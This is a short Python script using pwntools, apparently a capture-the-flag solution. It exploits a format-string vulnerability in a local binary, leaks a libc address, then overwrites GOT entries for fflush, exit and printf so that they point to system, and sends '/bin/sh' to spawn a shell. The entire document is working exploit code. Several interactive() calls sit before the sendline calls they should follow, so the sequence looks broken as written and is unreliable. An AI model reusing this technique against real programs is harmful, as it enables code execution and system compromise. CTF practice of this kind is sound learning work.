#!/usr/bin/env python3


from pwn import *
from time import sleep

context.arch = 'amd64'
e = ELF("./a.out")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = process("./a.out")
exploit = b"%004323x %p %p %p %p %p %p %p %p %p %hn " + b"\x38\x40\x40\x00\x00\x00\x00\x00"
r.sendline(exploit)
leak = int(r.recvuntil(b"992")[-14:],16)
libc_base = leak - 0x114992
exploit = fmtstr_payload(6,{e.got.fflush:0x401175},write_size='int')
r.sendline(exploit)
one_gadget = libc.sym.system
system = int("0x" + hex(libc_base + one_gadget)[-4:],16)
exploit = fmtstr_payload(6,{e.got.exit:system},write_size='short')
r.sendline(exploit)
system = int(hex(libc_base + one_gadget)[-8:-4],16)
exploit = fmtstr_payload(6,{e.got.exit+2:system},write_size='short')
r.interactive()
r.sendline(exploit)
system = int(hex(libc_base + one_gadget)[-12:-8],16)
exploit = fmtstr_payload(6,{e.got.exit+4:system},write_size='short')
r.interactive()
r.sendline(exploit)
exploit = fmtstr_payload(6,{e.got.printf:0x401070},write_size='int')
r.interactive()
r.sendline(exploit)
exploit = b"/bin/sh\x00"
r.interactive()
sleep(1)
r.sendline(exploit)
r.interactive()

